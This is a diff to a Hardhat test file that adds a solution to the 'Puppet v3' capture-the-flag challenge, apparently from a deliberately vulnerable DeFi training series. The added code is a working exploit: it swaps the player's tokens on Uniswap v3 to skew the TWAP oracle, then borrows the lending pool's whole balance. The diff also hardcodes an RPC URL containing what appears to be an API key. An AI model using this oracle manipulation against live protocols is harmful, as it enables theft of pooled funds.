@@ -5,6 +5,7 @@ const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers")
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
+const routerJson = require("@uniswap/v3-periphery/artifacts/contracts/SwapRouter.sol/SwapRouter.json");
 
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
@@ -26,7 +27,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth-mainnet.nodereal.io/v1/1659dfb40aa24bbb8153a677b98064d7";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +141,33 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let swapRouter = new ethers.Contract("0xE592427A0AEce92De3Edee1F18E0157C05861564", routerJson.abi, player);
+        
+        await token.connect(player).approve(swapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        /* params example
+            tokenIn: DAI,
+            tokenOut: WETH9,
+            fee: poolFee,
+            recipient: msg.sender,
+            deadline: block.timestamp,
+            amountIn: amountIn,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        */
+        await swapRouter.connect(player).exactInputSingle({
+            tokenIn: token.address,
+            tokenOut: weth.address,
+            fee: 3000,
+            recipient: player.address,
+            deadline: 2n * 10n ** 10n,
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        }, { gasLimit: 1e6 });  
+        
+        await weth.connect(player).approve(lendingPool.address, 192559690351479384n);
+        await time.increase(110);
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
